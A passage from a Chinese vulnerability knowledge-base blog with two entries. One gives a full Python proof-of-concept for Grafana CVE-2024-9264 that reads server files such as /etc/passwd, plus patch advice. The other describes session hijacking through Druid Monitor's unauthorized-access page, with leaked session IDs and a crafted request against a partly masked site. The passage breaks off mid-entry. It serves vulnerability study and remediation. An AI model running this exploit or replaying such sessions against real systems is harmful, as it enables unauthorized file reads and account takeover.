operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span> <span class="token builtin">error</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>db *DB</code>: DuckDB 数据库的实例指针。</li><li><code>refID string</code>: 查询的引用ID，通常用于日志记录和调试。</li><li><code>query string</code>: 要执行的 SQL 查询字符串。</li><li><code>inputFrames []*data.Frame</code>: 一个 <code>data.Frame</code> 切片，包含作为查询输入的数据。</li><li><code>resultFrame *data.Frame</code>: 一个指向 <code>data.Frame</code> 的指针，用于存储查询结果。</li></ul></blockquote><p>由于没有对SQL查询字符串做过滤限制，导致恶意的SQL语句直接传递到DuckDB执行。</p><h1 id="四、完整的POC"><a href="#四、完整的POC" class="headerlink" title="四、完整的POC"></a>四、完整的POC</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> sys<span class="token keyword">import</span> argparse<span class="token keyword">class</span> <span class="token class-name">Console</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">msg_success</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[SUCCESS] </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">msg_failure</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[FAILURE] </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">failure</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg_failure<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> u<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/login"</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"password"</span><span class="token punctuation">:</span> p<span class="token punctuation">,</span> <span class="token string">"user"</span><span class="token punctuation">:</span> u<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"Logged in"</span><span class="token punctuation">:</span>        msg_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Logged in as </span><span class="token interpolation"><span class="token punctuation">{</span>u<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        failure<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Failed to log in as </span><span class="token interpolation"><span class="token punctuation">{</span>u<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_query</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">:</span>    query_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/api/ds/query?ds_type=__expr__&amp;expression=true&amp;requestId=1"</span></span>    query_payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"from"</span><span class="token punctuation">:</span> <span class="token string">"1696154400000"</span><span class="token punctuation">,</span>        <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"1696345200000"</span><span class="token punctuation">,</span>        <span class="token string">"queries"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                <span class="token string">"datasource"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>                    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Expression"</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"__expr__"</span><span class="token punctuation">,</span>                    <span class="token string">"uid"</span><span class="token punctuation">:</span> <span class="token string">"__expr__"</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token string">"expression"</span><span class="token punctuation">:</span> query<span class="token punctuation">,</span>                <span class="token string">"hide"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>                <span class="token string">"refId"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span>                <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">,</span>                <span class="token string">"window"</span><span class="token punctuation">:</span> <span class="token string">""</span>            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>query_url<span class="token punctuation">,</span> json<span class="token operator">=</span>query_payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Handle unexpected response</span>    <span class="token keyword">if</span> <span class="token string">"message"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        msg_failure<span class="token punctuation">(</span><span class="token string">"Unexpected response:"</span><span class="token punctuation">)</span>        msg_failure<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token comment"># Extract results</span>    frames <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"results"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> frames<span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">[</span>            row            <span class="token keyword">for</span> frame <span class="token keyword">in</span> frames            <span class="token keyword">for</span> row <span class="token keyword">in</span> frame<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"values"</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span>                <span class="token keyword">if</span> values<span class="token punctuation">:</span>            msg_success<span class="token punctuation">(</span><span class="token string">"Successfully ran DuckDB query:"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> values    failure<span class="token punctuation">(</span><span class="token string">"No valid results found."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode_output</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">":"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> row <span class="token keyword">if</span> i <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> values<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    authenticate<span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">file</span> <span class="token keyword">or</span> <span class="token string">"/etc/passwd"</span>    escaped_filename <span class="token operator">=</span> requests<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    query <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"SELECT * FROM read_csv_auto('</span><span class="token interpolation"><span class="token punctuation">{</span>escaped_filename<span class="token punctuation">}</span></span><span class="token string">');"</span></span>    content <span class="token operator">=</span> run_query<span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">if</span> content<span class="token punctuation">:</span>        msg_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Retrieved file </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">:"</span></span><span class="token punctuation">)</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> decode_output<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"Arbitrary File Read in Grafana via SQL Expression (CVE-2024-9264)."</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--url"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"URL of the Grafana instance to exploit"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--user"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Username to log in as, defaults to 'admin'"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--password"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Password used to log in, defaults to 'admin'"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--file"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"File to read on the server, defaults to '/etc/passwd'"</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>user<span class="token punctuation">,</span> args<span class="token punctuation">.</span>password<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、漏洞测绘"><a href="#五、漏洞测绘" class="headerlink" title="五、漏洞测绘"></a>五、漏洞测绘</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">app</span><span class="token operator">=</span><span class="token string">"Grafana_Labs-公司产品"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="六、漏洞修复"><a href="#六、漏洞修复" class="headerlink" title="六、漏洞修复"></a>六、漏洞修复</h1><h2 id="6-1-官方漏洞修复"><a href="#6-1-官方漏洞修复" class="headerlink" title="6.1 官方漏洞修复"></a>6.1 官方漏洞修复</h2><p>11.4.0（latest）的源代码中对duckDB的功能直接进行了删除。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db :<span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span>NewInMemoryDB<span class="token punctuation">(</span><span class="token punctuation">)</span>var frame <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">data</span><span class="token punctuation">.</span>Frame{}logger<span class="token punctuation">.</span>Debug<span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err :<span class="token operator">=</span> db<span class="token punctuation">.</span>QueryFramesInto<span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.54.21.png" alt="11.4.0" style="zoom:50%;"><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.55.04.png" alt="11.1.0" style="zoom:50%;"><p>11.1.0中的导入模块列表中存在duck</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"context"</span><span class="token string">"errors"</span><span class="token string">"fmt"</span><span class="token string">"time"</span><span class="token string">"github.com/grafana/grafana-plugin-sdk-go/data"</span><span class="token string">"github.com/scottlepp/go-duck/duck"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/mathexp"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/sql"</span><span class="token string">"github.com/grafana/grafana/pkg/infra/tracing"</span><span class="token string">"github.com/grafana/grafana/pkg/util/errutil"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>11.4.0 的导入模块列表中删除了duckDB</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"context"</span><span class="token string">"errors"</span><span class="token string">"fmt"</span><span class="token string">"time"</span><span class="token string">"github.com/grafana/grafana-plugin-sdk-go/data"</span><span class="token string">"github.com/grafana/grafana/pkg/apimachinery/errutil"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/mathexp"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/sql"</span><span class="token string">"github.com/grafana/grafana/pkg/infra/tracing"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>11.4.0删除了sql表达式功能的实现。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2017.00.22.png" alt="11.4.0删除了sql表达式功能的实现" style="zoom:40%;"><h2 id="6-2-企业修复建议"><a href="#6-2-企业修复建议" class="headerlink" title="6.2 企业修复建议"></a>6.2 企业修复建议</h2><p>1）建议用户立即升级到已打补丁的版本：</p><ul><li>11.0.5+security-01 （仅安全修复）</li><li>11.1.6+security-01 （仅安全修复）</li><li>11.2.1+security-01 (仅安全修复)</li><li>11.0.6+security-01 （包含最新功能和安全修复）</li><li>11.1.7+security-01 （包含最新功能和安全修复）</li><li>11.2.2+security-01 （包括最新功能和安全修复）</li></ul><p>2）作为临时缓解措施，可以从系统的 PATH 中移除 DuckDB 二进制文件或完全卸载它。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li><a href="https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/">https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> Grafana表达式远程代码执行(CVE-2024-9264) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Druid未授权访问漏洞</title>
      <link href="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Druid简介"><a href="#一、Druid简介" class="headerlink" title="一、Druid简介"></a>一、Druid简介</h1><p><strong>Druid</strong> 是由阿里巴巴开发的一个高性能、分布式的数据库连接池（DataSource），主要用于 Java 应用程序中数据库连接的管理和优化。Druid 在功能、性能、稳定性和监控方面表现突出，是目前 Java 开发中常用的数据库连接池之一。</p><blockquote><p><strong>1）什么是数据库连接池？</strong></p><p><strong>数据库连接池（Database Connection Pool）</strong> 是一种用于管理和优化数据库连接的技术，它通过<strong>复用</strong>一组数据库连接，减少频繁创建和关闭数据库连接的开销，从而提升应用程序与数据库之间的性能和稳定性。</p><p><strong>2）为什么需要数据库连接池？</strong></p><p>在与数据库交互的过程中，建立一个新的数据库连接通常是一个<strong>开销较大</strong>的操作，主要包括以下步骤：</p><ol><li>创建数据库连接对象。</li><li>进行网络通信，验证身份。</li><li>分配资源（如内存、线程）。</li><li>关闭连接，释放资源。</li></ol><p>如果每次数据库操作都重新建立连接，尤其是在<strong>高并发环境</strong>下，会导致以下问题：</p><ul><li><strong>性能瓶颈</strong>：频繁建立和释放连接占用大量系统资源，影响响应速度。</li><li><strong>资源浪费</strong>：每个连接都占用一定的内存、CPU、网络资源，频繁操作可能导致资源耗尽。</li><li><strong>连接泄漏</strong>：如果连接未及时关闭，可能导致数据库连接耗尽，进而导致应用程序崩溃。</li></ul><p>为了解决这些问题，<strong>数据库连接池</strong>应运而生。</p><p>3）<strong>数据库连接池的工作原理？</strong></p><ol><li><strong>初始化连接池</strong>：应用程序启动时，连接池会创建一组数据库连接并保持它们处于空闲状态。这些连接会被缓存以供重复使用。</li><li><strong>分配连接</strong>：当应用程序需要与数据库交互时，从连接池中<strong>取出一个空闲连接</strong>，而不是新建一个连接。</li><li><strong>释放连接</strong>：操作完成后，应用程序不会关闭连接，而是将连接<strong>归还到连接池</strong>，供其他请求重复使用。</li><li><strong>连接维护</strong>：连接池会定期检测空闲连接的状态，<strong>移除无效连接</strong>，并根据需求动态增加或减少连接数量。</li></ol><p>数据库连接池是现代 Java 应用程序中不可或缺的组件，能够显著提升数据库访问性能、节省资源，并提高应用程序的并发能力。常见的连接池实现如 Druid、HikariCP 等，已经成为企业级开发的标配。</p></blockquote><h2 id="1-1-核心功能"><a href="#1-1-核心功能" class="headerlink" title="1.1 核心功能"></a>1.1 核心功能</h2><ol><li><p><strong>数据库连接池管理</strong><br>提供了灵活高效的数据库连接池管理，支持多种数据库（如 MySQL、PostgreSQL、Oracle、SQL Server 等），并能够有效管理数据库连接的生命周期。</p></li><li><p><strong>SQL 监控和统计</strong><br>内置了强大的 SQL 监控功能，能够记录 SQL 执行情况、慢查询、执行时间、错误等信息，帮助开发者优化 SQL 性能。</p><p>（监控SQL的执行时间、监控Web URI的请求、Session监控）</p></li><li><p><strong>SQL 防火墙</strong><br>提供了 SQL 防火墙功能，可以防止 SQL 注入攻击和不安全的 SQL 操作，确保数据库的安全性。</p></li><li><p><strong>高效的性能</strong><br>Druid 对连接池性能进行了优化，特别是在高并发和大规模应用场景下，具有更好的性能和稳定性。</p></li><li><p><strong>内存管理</strong><br>提供了对内存使用情况的监控和管理，支持自动清理无用连接，降低内存泄漏的风险。</p></li><li><p><strong>扩展性和灵活性</strong><br>Druid 提供了丰富的配置选项，支持多种扩展机制，开发者可以根据需求自定义连接池行为。</p></li></ol><h2 id="1-2-Druid-的组件"><a href="#1-2-Druid-的组件" class="headerlink" title="1.2 Druid 的组件"></a>1.2 Druid 的组件</h2><ol><li><strong>DruidDataSource</strong>：核心组件，负责数据库连接的管理。</li><li><strong>Druid Monitor</strong>：内置的 Web 监控页面，提供 SQL 执行、连接池状态等实时监控数据。</li><li><strong>Druid Filter</strong>：可自定义的过滤器链，支持监控、日志、SQL 防火墙等功能扩展。</li></ol><h2 id="1-3-主要优点"><a href="#1-3-主要优点" class="headerlink" title="1.3 主要优点"></a>1.3 主要优点</h2><ul><li><strong>易用性</strong>：配置简单，集成方便。</li><li><strong>高性能</strong>：对 JDBC 操作进行了多项优化，提升数据库访问速度。</li><li><strong>强大的监控能力</strong>：内置监控功能，无需额外配置。</li><li><strong>安全性</strong>：内置 SQL 防火墙，减少安全隐患。</li></ul><h2 id="1-4-Druid-的使用场景"><a href="#1-4-Druid-的使用场景" class="headerlink" title="1.4 Druid 的使用场景"></a>1.4 Druid 的使用场景</h2><ul><li>大型互联网应用的数据库连接管理。</li><li>需要高并发访问数据库的分布式系统。</li><li>需要监控和优化 SQL 性能的企业级应用。</li></ul><h1 id="二、Druid未授权访问漏洞"><a href="#二、Druid未授权访问漏洞" class="headerlink" title="二、Druid未授权访问漏洞"></a>二、Druid未授权访问漏洞</h1><p>在日常的威胁告警分析中经常看到有攻击者在使用扫描工具进行druid未授权访问的测试，所以想借机会学习一下该漏洞的成因、特征、危害、利用方法和修复方法。</p><h2 id="2-1-漏洞成因"><a href="#2-1-漏洞成因" class="headerlink" title="2.1 漏洞成因"></a>2.1 漏洞成因</h2><p>Druid未授权访问漏洞是由于当开发者配置不当、权限控制失效导致的。</p><h2 id="2-2-漏洞特征"><a href="#2-2-漏洞特征" class="headerlink" title="2.2 漏洞特征"></a>2.2 漏洞特征</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.xxxx.com/druid/index.htmlhttps://****.bl******.com.cn/***-***-service/druid/index.htmlhttp://****.bl******.com.cn/***-****-view/<span class="token comment">#/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-3-漏洞危害"><a href="#2-3-漏洞危害" class="headerlink" title="2.3 漏洞危害"></a>2.3 漏洞危害</h2><p>通过DruidMonitor未授权访问可获取管理员信息。</p><h2 id="2-4-漏洞利用"><a href="#2-4-漏洞利用" class="headerlink" title="2.4 漏洞利用"></a>2.4 漏洞利用</h2><p>整体思路：通过Druid Monitor未授权访问找到SESSION监控页面下面的一些SESSION信息和URI监控下的路径，以及通过配合目标网站大数据产品平台的登录等一系列测试，可获得一起管理员以及其他注册成员信息。</p><h3 id="1）未授权访问index-html界面"><a href="#1）未授权访问index-html界面" class="headerlink" title="1）未授权访问index.html界面"></a>1）未授权访问index.html界面</h3><p>首先，是未授权的访问界面，主要关注Session监控和URI监控这两个地方，如图：</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.51.05.png" alt="session监控信息泄漏" style="zoom:50%;"><p>存在大量被泄漏的session信息及其对应访问的IP地址。不管是登陆成功的，没登陆成功的，还是失效的都会储存在这里。</p><p>优先选择暴露在互联网的进行利用。</p><h3 id="2）通过session完成攻击面的扩展"><a href="#2）通过session完成攻击面的扩展" class="headerlink" title="2）通过session完成攻击面的扩展"></a>2）通过session完成攻击面的扩展</h3><p>例如有一些敏感的SessionId。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">0b055336<span class="token operator">-</span>85f8<span class="token operator">-</span>4bdc<span class="token operator">-</span><span class="token number">8008</span><span class="token operator">-</span>d45dc23c6b2f7a5681a1<span class="token operator">-</span>a790<span class="token operator">-</span>47fa<span class="token operator">-</span>948b<span class="token operator">-</span>a1f1a3532d09  3aaaa4d3<span class="token operator">-</span><span class="token number">1259</span><span class="token operator">-</span><span class="token number">4e64</span><span class="token operator">-</span>835d<span class="token operator">-</span>fb1f9bf35eda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同时，URI监控的页面会泄漏一些URI登录地址，通过session替换进行登录，观察效果。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.55.49.png" alt="URI监控信息泄漏" style="zoom:50%;"><p>如：membership/index 页面，构造数据包进行测试。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">POST</span> <span class="token comment">/********-service/me****ship/index/ HTTP/1.1Host: *****.bl*******.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101Firefox/79.0Accept: application/json, text/plain, */</span><span class="token operator">*</span>Accept<span class="token operator">-</span>Language<span class="token operator">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">TW</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">HK</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>en<span class="token operator">-</span><span class="token constant">US</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.2</span>Accept<span class="token operator">-</span>Encoding<span class="token operator">:</span> gzip<span class="token punctuation">,</span> deflateContent<span class="token operator">-</span>Type<span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>Content<span class="token operator">-</span>Length<span class="token operator">:</span> <span class="token number">101</span><span class="token literal-property property">Origin</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token comment">/***p.********.com.c*Connection: closeReferer: http://*****.bl*******.com.cn/******-view/Cookie: Hm_lvt_ed752fa41bdfde359bfde28ccd27b888=1597904479,1597907505;sid=0b055336-85f8-4bdc-8008-d45dc23c6b2f;token=029d8a6ac03358de6e57c7254acbd017;username=80560478&amp;password=FSMBKxmUSkq9MfJjyAgyEA%3D%3D&amp;isCookieLogin=Y&amp;validationCode=anqr&amp;brand=999</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookie中的sid参数，即为session里面监控找到的数据。</p><p>BP分析请求和响应：</p><img 